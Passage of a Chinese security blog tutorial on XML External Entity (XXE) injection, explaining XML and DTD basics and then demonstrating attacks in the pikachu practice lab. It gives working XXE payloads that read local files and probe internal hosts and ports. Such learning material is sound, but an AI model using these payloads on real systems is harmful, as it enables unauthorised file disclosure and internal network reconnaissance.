<!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=2"><meta name="theme-color" content="#222"><meta name="generator" content="Hexo 5.4.0"><link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png"><link rel="icon" type="image/png" sizes="32x32" href="/images/%E6%88%91%E7%9A%84%E5%AD%A6%E4%B9%A0%20(1).png"><link rel="icon" type="image/png" sizes="16x16" href="/images/%E6%88%91%E7%9A%84%E5%AD%A6%E4%B9%A0.png"><link rel="mask-icon" href="/images/logo.svg" color="#222"><meta name="baidu-site-verification" content="code-ohRVdKq7d5"><link rel="stylesheet" href="/css/main.css"><link rel="stylesheet" href="//fonts.googleapis.com/css?family=微软雅黑:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext"><link rel="stylesheet" href="/lib/font-awesome/css/all.min.css"><link rel="stylesheet" href="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.css"><script id="hexo-configurations">var NexT=window.NexT||{},CONFIG={hostname:"www.zymstudy.club",root:"/",scheme:"Gemini",version:"7.8.0",exturl:!1,sidebar:{position:"left",display:"post",padding:18,offset:12,onmobile:!1},copycode:{enable:!0,show_result:"ftrue",style:"flat"},back2top:{enable:!0,sidebar:!0,scrollpercent:!0},bookmark:{enable:!1,color:"#222",save:"auto"},fancybox:!0,mediumzoom:!1,lazyload:!1,pangu:!1,comments:{style:"tabs",active:null,storage:!0,lazyload:!1,nav:null},algolia:{hits:{per_page:10},labels:{input_placeholder:"Search for Posts",hits_empty:"We didn't find any results for the search: ${query}",hits_stats:"${hits} results found in ${time} ms"}},localsearch:{enable:!0,trigger:"auto",top_n_per_article:1,unescape:!1,preload:!1},motion:{enable:!0,async:!1,transition:{post_block:"fadeIn",post_header:"slideDownIn",post_body:"slideDownIn",coll_header:"slideLeftIn",sidebar:"slideUpIn"}},path:"search.xml"}</script><meta name="description" content="XXE&amp;XML之利用检测绕过全解 一.XML原理分析1.XML和XXE区别XML 被设计为传输和存储数据，XML 文档结构包括 XML 声明、DTD 文档类型定义（可选）、文档元素，其焦点是数据的内容，其把数据从 HTML 分离，是独立于软件和硬件的信息传输工具。 XXE 漏洞全称XML External Entity Injection，即 xml 外部实体注入漏洞，XXE 漏洞发生在应"><meta property="og:type" content="article"><meta property="og:title" content="XXE&amp;XML之利用检测绕过全解"><meta property="og:url" content="https://www.zymstudy.club/2022/03/30/XXE-XML%E4%B9%8B%E5%88%A9%E7%94%A8%E6%A3%80%E6%B5%8B%E7%BB%95%E8%BF%87%E5%85%A8%E8%A7%A3/index.html"><meta property="og:site_name" content="猪哥的博客"><meta property="og:description" content="XXE&amp;XML之利用检测绕过全解 一.XML原理分析1.XML和XXE区别XML 被设计为传输和存储数据，XML 文档结构包括 XML 声明、DTD 文档类型定义（可选）、文档元素，其焦点是数据的内容，其把数据从 HTML 分离，是独立于软件和硬件的信息传输工具。 XXE 漏洞全称XML External Entity Injection，即 xml 外部实体注入漏洞，XXE 漏洞发生在应"><meta property="og:locale" content="zh_CN"><meta property="og:image" content="https://www.zymstudy.club/2022/03/30/XXE-XML%E4%B9%8B%E5%88%A9%E7%94%A8%E6%A3%80%E6%B5%8B%E7%BB%95%E8%BF%87%E5%85%A8%E8%A7%A3/image1.webp"><meta property="og:image" content="https://www.zymstudy.club/2022/03/30/XXE-XML%E4%B9%8B%E5%88%A9%E7%94%A8%E6%A3%80%E6%B5%8B%E7%BB%95%E8%BF%87%E5%85%A8%E8%A7%A3/image2.png"><meta property="og:image" content="https://www.zymstudy.club/2022/03/30/XXE-XML%E4%B9%8B%E5%88%A9%E7%94%A8%E6%A3%80%E6%B5%8B%E7%BB%95%E8%BF%87%E5%85%A8%E8%A7%A3/image3.png"><meta property="og:image" content="https://www.zymstudy.club/2022/03/30/XXE-XML%E4%B9%8B%E5%88%A9%E7%94%A8%E6%A3%80%E6%B5%8B%E7%BB%95%E8%BF%87%E5%85%A8%E8%A7%A3/image4.png"><meta property="og:image" content="https://www.zymstudy.club/2022/03/30/XXE-XML%E4%B9%8B%E5%88%A9%E7%94%A8%E6%A3%80%E6%B5%8B%E7%BB%95%E8%BF%87%E5%85%A8%E8%A7%A3/image5.png"><meta property="og:image" content="https://www.zymstudy.club/2022/03/30/XXE-XML%E4%B9%8B%E5%88%A9%E7%94%A8%E6%A3%80%E6%B5%8B%E7%BB%95%E8%BF%87%E5%85%A8%E8%A7%A3/image6.png"><meta property="og:image" content="https://www.zymstudy.club/2022/03/30/XXE-XML%E4%B9%8B%E5%88%A9%E7%94%A8%E6%A3%80%E6%B5%8B%E7%BB%95%E8%BF%87%E5%85%A8%E8%A7%A3/image7.png"><meta property="og:image" content="https://www.zymstudy.club/2022/03/30/XXE-XML%E4%B9%8B%E5%88%A9%E7%94%A8%E6%A3%80%E6%B5%8B%E7%BB%95%E8%BF%87%E5%85%A8%E8%A7%A3/image8.png"><meta property="og:image" content="https://www.zymstudy.club/2022/03/30/XXE-XML%E4%B9%8B%E5%88%A9%E7%94%A8%E6%A3%80%E6%B5%8B%E7%BB%95%E8%BF%87%E5%85%A8%E8%A7%A3/image9.png"><meta property="og:image" content="https://www.zymstudy.club/2022/03/30/XXE-XML%E4%B9%8B%E5%88%A9%E7%94%A8%E6%A3%80%E6%B5%8B%E7%BB%95%E8%BF%87%E5%85%A8%E8%A7%A3/image10.png"><meta property="og:image" content="https://www.zymstudy.club/2022/03/30/XXE-XML%E4%B9%8B%E5%88%A9%E7%94%A8%E6%A3%80%E6%B5%8B%E7%BB%95%E8%BF%87%E5%85%A8%E8%A7%A3/image11.png"><meta property="og:image" content="https://www.zymstudy.club/2022/03/30/XXE-XML%E4%B9%8B%E5%88%A9%E7%94%A8%E6%A3%80%E6%B5%8B%E7%BB%95%E8%BF%87%E5%85%A8%E8%A7%A3/image12.png"><meta property="og:image" content="https://www.zymstudy.club/2022/03/30/XXE-XML%E4%B9%8B%E5%88%A9%E7%94%A8%E6%A3%80%E6%B5%8B%E7%BB%95%E8%BF%87%E5%85%A8%E8%A7%A3/image13.png"><meta property="og:image" content="https://www.zymstudy.club/2022/03/30/XXE-XML%E4%B9%8B%E5%88%A9%E7%94%A8%E6%A3%80%E6%B5%8B%E7%BB%95%E8%BF%87%E5%85%A8%E8%A7%A3/image14.png"><meta property="og:image" content="https://www.zymstudy.club/2022/03/30/XXE-XML%E4%B9%8B%E5%88%A9%E7%94%A8%E6%A3%80%E6%B5%8B%E7%BB%95%E8%BF%87%E5%85%A8%E8%A7%A3/image15.png"><meta property="og:image" content="https://www.zymstudy.club/2022/03/30/XXE-XML%E4%B9%8B%E5%88%A9%E7%94%A8%E6%A3%80%E6%B5%8B%E7%BB%95%E8%BF%87%E5%85%A8%E8%A7%A3/image16.png"><meta property="og:image" content="https://www.zymstudy.club/2022/03/30/XXE-XML%E4%B9%8B%E5%88%A9%E7%94%A8%E6%A3%80%E6%B5%8B%E7%BB%95%E8%BF%87%E5%85%A8%E8%A7%A3/image17.png"><meta property="og:image" content="https://www.zymstudy.club/2022/03/30/XXE-XML%E4%B9%8B%E5%88%A9%E7%94%A8%E6%A3%80%E6%B5%8B%E7%BB%95%E8%BF%87%E5%85%A8%E8%A7%A3/image18.png"><meta property="og:image" content="https://www.zymstudy.club/2022/03/30/XXE-XML%E4%B9%8B%E5%88%A9%E7%94%A8%E6%A3%80%E6%B5%8B%E7%BB%95%E8%BF%87%E5%85%A8%E8%A7%A3/image19.png"><meta property="og:image" content="https://www.zymstudy.club/2022/03/30/XXE-XML%E4%B9%8B%E5%88%A9%E7%94%A8%E6%A3%80%E6%B5%8B%E7%BB%95%E8%BF%87%E5%85%A8%E8%A7%A3/image20.png"><meta property="og:image" content="https://www.zymstudy.club/2022/03/30/XXE-XML%E4%B9%8B%E5%88%A9%E7%94%A8%E6%A3%80%E6%B5%8B%E7%BB%95%E8%BF%87%E5%85%A8%E8%A7%A3/image21.png"><meta property="og:image" content="https://www.zymstudy.club/2022/03/30/XXE-XML%E4%B9%8B%E5%88%A9%E7%94%A8%E6%A3%80%E6%B5%8B%E7%BB%95%E8%BF%87%E5%85%A8%E8%A7%A3/image22.png"><meta property="og:image" content="https://www.zymstudy.club/2022/03/30/XXE-XML%E4%B9%8B%E5%88%A9%E7%94%A8%E6%A3%80%E6%B5%8B%E7%BB%95%E8%BF%87%E5%85%A8%E8%A7%A3/image23.png"><meta property="og:image" content="https://www.zymstudy.club/2022/03/30/XXE-XML%E4%B9%8B%E5%88%A9%E7%94%A8%E6%A3%80%E6%B5%8B%E7%BB%95%E8%BF%87%E5%85%A8%E8%A7%A3/image24.png"><meta property="og:image" content="https://www.zymstudy.club/2022/03/30/XXE-XML%E4%B9%8B%E5%88%A9%E7%94%A8%E6%A3%80%E6%B5%8B%E7%BB%95%E8%BF%87%E5%85%A8%E8%A7%A3/image25.png"><meta property="og:image" content="https://www.zymstudy.club/2022/03/30/XXE-XML%E4%B9%8B%E5%88%A9%E7%94%A8%E6%A3%80%E6%B5%8B%E7%BB%95%E8%BF%87%E5%85%A8%E8%A7%A3/image26.png"><meta property="og:image" content="https://www.zymstudy.club/2022/03/30/XXE-XML%E4%B9%8B%E5%88%A9%E7%94%A8%E6%A3%80%E6%B5%8B%E7%BB%95%E8%BF%87%E5%85%A8%E8%A7%A3/image27.png"><meta property="og:image" content="https://www.zymstudy.club/2022/03/30/XXE-XML%E4%B9%8B%E5%88%A9%E7%94%A8%E6%A3%80%E6%B5%8B%E7%BB%95%E8%BF%87%E5%85%A8%E8%A7%A3/image28.png"><meta property="og:image" content="https://www.zymstudy.club/2022/03/30/XXE-XML%E4%B9%8B%E5%88%A9%E7%94%A8%E6%A3%80%E6%B5%8B%E7%BB%95%E8%BF%87%E5%85%A8%E8%A7%A3/image29.png"><meta property="og:image" content="https://www.zymstudy.club/2022/03/30/XXE-XML%E4%B9%8B%E5%88%A9%E7%94%A8%E6%A3%80%E6%B5%8B%E7%BB%95%E8%BF%87%E5%85%A8%E8%A7%A3/image30.png"><meta property="og:image" content="https://www.zymstudy.club/2022/03/30/XXE-XML%E4%B9%8B%E5%88%A9%E7%94%A8%E6%A3%80%E6%B5%8B%E7%BB%95%E8%BF%87%E5%85%A8%E8%A7%A3/image31.png"><meta property="og:image" content="https://www.zymstudy.club/2022/03/30/XXE-XML%E4%B9%8B%E5%88%A9%E7%94%A8%E6%A3%80%E6%B5%8B%E7%BB%95%E8%BF%87%E5%85%A8%E8%A7%A3/image32.png"><meta property="og:image" content="https://www.zymstudy.club/2022/03/30/XXE-XML%E4%B9%8B%E5%88%A9%E7%94%A8%E6%A3%80%E6%B5%8B%E7%BB%95%E8%BF%87%E5%85%A8%E8%A7%A3/image33.png"><meta property="og:image" content="https://www.zymstudy.club/2022/03/30/XXE-XML%E4%B9%8B%E5%88%A9%E7%94%A8%E6%A3%80%E6%B5%8B%E7%BB%95%E8%BF%87%E5%85%A8%E8%A7%A3/image34.png"><meta property="og:image" content="https://www.zymstudy.club/2022/03/30/XXE-XML%E4%B9%8B%E5%88%A9%E7%94%A8%E6%A3%80%E6%B5%8B%E7%BB%95%E8%BF%87%E5%85%A8%E8%A7%A3/image35.png"><meta property="og:image" content="https://www.zymstudy.club/2022/03/30/XXE-XML%E4%B9%8B%E5%88%A9%E7%94%A8%E6%A3%80%E6%B5%8B%E7%BB%95%E8%BF%87%E5%85%A8%E8%A7%A3/image36.png"><meta property="og:image" content="https://www.zymstudy.club/2022/03/30/XXE-XML%E4%B9%8B%E5%88%A9%E7%94%A8%E6%A3%80%E6%B5%8B%E7%BB%95%E8%BF%87%E5%85%A8%E8%A7%A3/image37.png"><meta property="og:image" content="https://www.zymstudy.club/2022/03/30/XXE-XML%E4%B9%8B%E5%88%A9%E7%94%A8%E6%A3%80%E6%B5%8B%E7%BB%95%E8%BF%87%E5%85%A8%E8%A7%A3/image38.png"><meta property="og:image" content="https://www.zymstudy.club/2022/03/30/XXE-XML%E4%B9%8B%E5%88%A9%E7%94%A8%E6%A3%80%E6%B5%8B%E7%BB%95%E8%BF%87%E5%85%A8%E8%A7%A3/image39.png"><meta property="og:image" content="https://www.zymstudy.club/2022/03/30/XXE-XML%E4%B9%8B%E5%88%A9%E7%94%A8%E6%A3%80%E6%B5%8B%E7%BB%95%E8%BF%87%E5%85%A8%E8%A7%A3/image40.png"><meta property="og:image" content="https://www.zymstudy.club/2022/03/30/XXE-XML%E4%B9%8B%E5%88%A9%E7%94%A8%E6%A3%80%E6%B5%8B%E7%BB%95%E8%BF%87%E5%85%A8%E8%A7%A3/image41.png"><meta property="article:published_time" content="2022-03-30T07:44:04.000Z"><meta property="article:modified_time" content="2022-03-30T13:52:07.685Z"><meta property="article:author" content="zym"><meta property="article:tag" content="小白，学习"><meta name="twitter:card" content="summary"><meta name="twitter:image" content="https://www.zymstudy.club/2022/03/30/XXE-XML%E4%B9%8B%E5%88%A9%E7%94%A8%E6%A3%80%E6%B5%8B%E7%BB%95%E8%BF%87%E5%85%A8%E8%A7%A3/image1.webp"><link rel="canonical" href="https://www.zymstudy.club/2022/03/30/XXE-XML%E4%B9%8B%E5%88%A9%E7%94%A8%E6%A3%80%E6%B5%8B%E7%BB%95%E8%BF%87%E5%85%A8%E8%A7%A3/"><script id="page-configurations">CONFIG.page={sidebar:"",isHome:!1,isPost:!0,lang:"zh-CN"}</script><title>XXE&XML之利用检测绕过全解 | 猪哥的博客</title><script>var _hmt=_hmt||[];!function(){var e=document.createElement("script");e.src="https://hm.baidu.com/hm.js?63a74bc13be305eea159120a99117598";var t=document.getElementsByTagName("script")[0];t.parentNode.insertBefore(e,t)}()</script><noscript><style>.sidebar-inner,.use-motion .brand,.use-motion .collection-header,.use-motion .comments,.use-motion .menu-item,.use-motion .pagination,.use-motion .post-block,.use-motion .post-body,.use-motion .post-header{opacity:initial}.use-motion .site-subtitle,.use-motion .site-title{opacity:initial;top:initial}.use-motion .logo-line-before i{left:initial}.use-motion .logo-line-after i{right:initial}</style></noscript></head><body itemscope itemtype="http://schema.org/WebPage"><div class="container use-motion"><div class="headband"></div><header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="header-inner"><div class="site-brand-container"><div class="site-nav-toggle"><div class="toggle" aria-label="切换导航栏"><span class="toggle-line toggle-line-first"></span> <span class="toggle-line toggle-line-middle"></span> <span class="toggle-line toggle-line-last"></span></div></div><div class="site-meta"><a href="/" class="brand" rel="start"><span class="logo-line-before"><i></i></span><h1 class="site-title">猪哥的博客</h1><span class="logo-line-after"><i></i></span></a><p class="site-subtitle" itemprop="description">25了还没去过星巴克的可怜猪哥</p></div><div class="site-nav-right"><div class="toggle popup-trigger"><i class="fa fa-search fa-fw fa-lg"></i></div></div></div><nav class="site-nav"><ul id="menu" class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="home fa-fw"></i>首页</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="tags fa-fw"></i>标签<span class="badge">17</span></a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="th fa-fw"></i>分类<span class="badge">5</span></a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="acchive fa-fw"></i>归档<span class="badge">39</span></a></li><li class="menu-item menu-item-search"><a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索</a></li></ul></nav><div class="search-pop-overlay"><div class="popup search-popup"><div class="search-header"><span class="search-icon"><i class="fa fa-search"></i></span><div class="search-input-container"><input autocomplete="off" autocapitalize="off" placeholder="搜索..." spellcheck="false" type="search" class="search-input"></div><span class="popup-btn-close"><i class="fa fa-times-circle"></i></span></div><div id="search-result"><div id="no-result"><i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i></div></div></div></div></div></header><div class="reading-progress-bar"></div><main class="main"><div class="main-inner"><div class="content-wrap"><div class="content post posts-expand"><article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN"><link itemprop="mainEntityOfPage" href="https://www.zymstudy.club/2022/03/30/XXE-XML%E4%B9%8B%E5%88%A9%E7%94%A8%E6%A3%80%E6%B5%8B%E7%BB%95%E8%BF%87%E5%85%A8%E8%A7%A3/"><span hidden itemprop="author" itemscope itemtype="http://schema.org/Person"><meta itemprop="image" content="/images/Panda.jpg"><meta itemprop="name" content="zym"><meta itemprop="description" content="生活日常随笔"></span><span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization"><meta itemprop="name" content="猪哥的博客"></span><header class="post-header"><h1 class="post-title" itemprop="name headline">XXE&XML之利用检测绕过全解</h1><div class="post-meta"><span class="post-meta-item"><span class="post-meta-item-icon"><i class="far fa-calendar"></i> </span><span class="post-meta-item-text">发表于</span> <time title="创建时间：2022-03-30 15:44:04 / 修改时间：21:52:07" itemprop="dateCreated datePublished" datetime="2022-03-30T15:44:04+08:00">2022-03-30</time> </span><span class="post-meta-item"><span class="post-meta-item-icon"><i class="far fa-folder"></i> </span><span class="post-meta-item-text">分类于</span> <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/web%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0/" itemprop="url" rel="index"><span itemprop="name">web安全渗透学习</span></a> </span></span><span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display:none"><span class="post-meta-item-icon"><i class="fa fa-eye"></i> </span><span class="post-meta-item-text">阅读次数：</span> <span id="busuanzi_value_page_pv"></span> </span><span class="post-meta-item"><span class="post-meta-item-icon"><i class="far fa-comment"></i> </span><span class="post-meta-item-text">Valine：</span> <a title="valine" href="/2022/03/30/XXE-XML%E4%B9%8B%E5%88%A9%E7%94%A8%E6%A3%80%E6%B5%8B%E7%BB%95%E8%BF%87%E5%85%A8%E8%A7%A3/#valine-comments" itemprop="discussionUrl"><span class="post-comments-count valine-comment-count" data-xid="/2022/03/30/XXE-XML%E4%B9%8B%E5%88%A9%E7%94%A8%E6%A3%80%E6%B5%8B%E7%BB%95%E8%BF%87%E5%85%A8%E8%A7%A3/" itemprop="commentCount"></span></a></span><br><span class="post-meta-item" title="本文字数"><span class="post-meta-item-icon"><i class="far fa-file-word"></i> </span><span class="post-meta-item-text">本文字数：</span> <span>6.8k</span> </span><span class="post-meta-item" title="阅读时长"><span class="post-meta-item-icon"><i class="far fa-clock"></i> </span><span class="post-meta-item-text">阅读时长 &asymp;</span> <span>6 分钟</span></span></div></header><div class="post-body" itemprop="articleBody"><h1 id="XXE-amp-XML之利用检测绕过全解"><a href="#XXE-amp-XML之利用检测绕过全解" class="headerlink" title="XXE&amp;XML之利用检测绕过全解"></a>XXE&amp;XML之利用检测绕过全解</h1><p><img src="/2022/03/30/XXE-XML%E4%B9%8B%E5%88%A9%E7%94%A8%E6%A3%80%E6%B5%8B%E7%BB%95%E8%BF%87%E5%85%A8%E8%A7%A3/image1.webp" alt="image1"></p><h2 id="一-XML原理分析"><a href="#一-XML原理分析" class="headerlink" title="一.XML原理分析"></a>一.XML原理分析</h2><h3 id="1-XML和XXE区别"><a href="#1-XML和XXE区别" class="headerlink" title="1.XML和XXE区别"></a>1.XML和XXE区别</h3><p>XML 被设计为<strong>传输和存储</strong>数据，XML 文档结构包括 <strong>XML 声明</strong>、<strong>DTD 文档类型定义（可选）</strong>、<strong>文档元素</strong>，其焦点是<strong>数据的内容</strong>，其把数据<strong>从 HTML 分离</strong>，是独立于软件和硬件的信息传输工具。</p><p>XXE 漏洞全称XML External Entity Injection，即 xml 外部实体注入漏洞，XXE 漏洞发生在应用程序<strong>解析 XML 输入时，没有禁止外部实体的加载</strong>，导致可加载恶意外部文件，造成文件读取、命令执行、内网端口扫描、攻击内网网站等危害。</p><h3 id="2-XML和HTML的区别"><a href="#2-XML和HTML的区别" class="headerlink" title="2.XML和HTML的区别"></a>2.XML和HTML的区别</h3><p>XML 与 HTML 的主要差异：XML 被设计为<strong>传输和存储</strong>数据，其焦点是数据的<strong>内容</strong>。HTML 被设计用来<strong>显示</strong>数据，其焦点是数据的<strong>外观</strong>。HTML 旨在显示信息 ，而 XML 旨在传输信息。</p><p><strong>XML典型代码：</strong></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--XML声明--&gt;</span></span><br><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot;?&gt;</span></span><br><span class="line"><span class="comment">&lt;!--文档类型定义--&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">note</span> [ &lt;!--定义此文档是 note 类型的文档--&gt;</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="meta-keyword">note</span> (<span class="meta-keyword">to</span>,<span class="meta-keyword">from</span>,<span class="meta-keyword">heading</span>,<span class="meta-keyword">body</span>)&gt;</span> &lt;!--定义note元素有四个元素--&gt;</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="meta-keyword">to</span> (<span class="meta-keyword">#PCDATA</span>)&gt;</span> &lt;!--定义to元素为”#PCDATA”类型--&gt;</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="meta-keyword">from</span> (<span class="meta-keyword">#PCDATA</span>)&gt;</span> &lt;!--定义from元素为”#PCDATA”类型--&gt;</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="meta-keyword">head</span> (<span class="meta-keyword">#PCDATA</span>)&gt;</span> &lt;!--定义head元素为”#PCDATA”类型--&gt;</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="meta-keyword">body</span> (<span class="meta-keyword">#PCDATA</span>)&gt;</span> &lt;!--定义body元素为”#PCDATA”类型--&gt;</span></span><br><span class="line"><span class="meta">]]]&gt;</span></span><br><span class="line"><span class="comment">&lt;!--文档元素--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">note</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">to</span>&gt;</span>Dave<span class="tag">&lt;/<span class="name">to</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">from</span>&gt;</span>Tom<span class="tag">&lt;/<span class="name">from</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span>Reminder<span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span>You are a good man<span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">note</span>&gt;</span></span><br></pre></td></tr></table></figure><p><strong>DTD：</strong></p><p>文档类型定义（DTD）可定义合法的XML文档构建模块<br>它使用一系列合法的元素来定义文档的结构<br>DTD可被成行地声明于XML文档中，也可作为一个外部引用</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">(1)内部的DOCTYPE声明</span><br><span class="line"><span class="meta">&lt;!DOCTYPE 根元素 [元素声明]&gt;</span></span><br><span class="line"></span><br><span class="line">(2)外部文档声明</span><br><span class="line"><span class="meta">&lt;!DOCTYPE 根元素 <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;文件名&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure><p><strong>DTD实体：</strong></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">(1)内部实体声明</span><br><span class="line"><span class="meta">&lt;!ENTITY 实体名称 <span class="meta-string">&quot;实体的值&quot;</span>&gt;</span></span><br><span class="line">(2)外部实体声明</span><br><span class="line"><span class="meta">&lt;!ENTITY 实体名称 <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;URI&quot;</span>&gt;</span></span><br><span class="line">(3)参数实体声明</span><br><span class="line"><span class="meta">&lt;!ENTITY %实体名称 <span class="meta-string">&quot;实体的值&quot;</span>&gt;</span></span><br><span class="line"><span class="meta">&lt;!ENTITY %实体名称 <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;URI&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="二-pikachu靶场——XML数据传输测试（回显，玩法，协议，引入）"><a href="#二-pikachu靶场——XML数据传输测试（回显，玩法，协议，引入）" class="headerlink" title="二.pikachu靶场——XML数据传输测试（回显，玩法，协议，引入）"></a>二.pikachu靶场——XML数据传输测试（回显，玩法，协议，引入）</h2><h3 id="1-各种协议的脚本适用环境"><a href="#1-各种协议的脚本适用环境" class="headerlink" title="1.各种协议的脚本适用环境"></a>1.各种协议的脚本适用环境</h3><p><img src="/2022/03/30/XXE-XML%E4%B9%8B%E5%88%A9%E7%94%A8%E6%A3%80%E6%B5%8B%E7%BB%95%E8%BF%87%E5%85%A8%E8%A7%A3/image2.png" alt="image2"></p><h3 id="2-进入靶场"><a href="#2-进入靶场" class="headerlink" title="2.进入靶场"></a>2.进入靶场</h3><p><img src="/2022/03/30/XXE-XML%E4%B9%8B%E5%88%A9%E7%94%A8%E6%A3%80%E6%B5%8B%E7%BB%95%E8%BF%87%E5%85%A8%E8%A7%A3/image3.png" alt="image3"></p><h3 id="3-玩法1——读取文件"><a href="#3-玩法1——读取文件" class="headerlink" title="3.玩法1——读取文件"></a>3.玩法1——读取文件</h3><p>用file伪协议读取c盘的1.txt文件，当然这里的伪协议是隐藏在XML的文档实体中</p><p>这种是有回显的类型的漏洞</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version = &quot;1.0&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">ANY</span> [</span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY <span class="meta-keyword">xxe</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;file:///c://1.txt&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">x</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">x</span>&gt;</span></span><br><span class="line">//xxe为变量，读取1.txt</span><br><span class="line">//打印出来</span><br><span class="line">//用file协议读取指定路径的文件</span><br></pre></td></tr></table></figure><p>显示结果</p><p><img src="/2022/03/30/XXE-XML%E4%B9%8B%E5%88%A9%E7%94%A8%E6%A3%80%E6%B5%8B%E7%BB%95%E8%BF%87%E5%85%A8%E8%A7%A3/image4.png" alt="image4"></p><h3 id="4-玩法2——内网探针或者攻击内网应用（触发漏洞地址）"><a href="#4-玩法2——内网探针或者攻击内网应用（触发漏洞地址）" class="headerlink" title="4.玩法2——内网探针或者攻击内网应用（触发漏洞地址）"></a>4.玩法2——内网探针或者攻击内网应用（触发漏洞地址）</h3><p>如下脚本，将其复制粘贴，提交</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">foo</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="meta-keyword">foo</span> <span class="meta-keyword">ANY</span> &gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="meta-keyword">rabbit</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;http://192.168.176.128:10086/1.txt&quot;</span> &gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">x</span>&gt;</span><span class="symbol">&amp;rabbit;</span><span class="tag">&lt;/<span class="name">x</span>&gt;</span></span><br></pre></td></tr></table></figure><p>返回文件内容，说明内网中192.168.176.128服务器上，1.txt文件是存在的，也可以说10086端口是开放的，因此这里这个xxe漏洞，可以实现内网探针。</p><p><img src="/2022/03/30/XXE-XML%E4%B9%8B%E5%88%A9%E7%94%A8%E6%A3%80%E6%B5%8B%E7%BB%95%E8%BF%87%E5%85%A8%E8%A7%A3/image5.png" alt="image5"></p><p>如果是其他脚本文件，例如php脚本，则会执行这个脚本。此处一个脚本xuliehua.php</p><p><img src="/2022/03/30/XXE-XML%E4%B9%8B%E5%88%A9%E7%94%A8%E6%A3%80%E6%B5%8B%E7%BB%95%E8%BF%87%E5%85%A8%E8%A7%A3/image6.png" alt="image6"></p><p>会报执行结果</p><p><img src="/2022/03/30/XXE-XML%E4%B9%8B%E5%88%A9%E7%94%A8%E6%A3%80%E6%B5%8B%E7%BB%95%E8%BF%87%E5%85%A8%E8%A7%A3/image7.png" alt="image7"></p><p>如果文件不存在，就会报错，比如此处改为不存在的giao.txt，服务器返回一行报错信息。</p><p><img 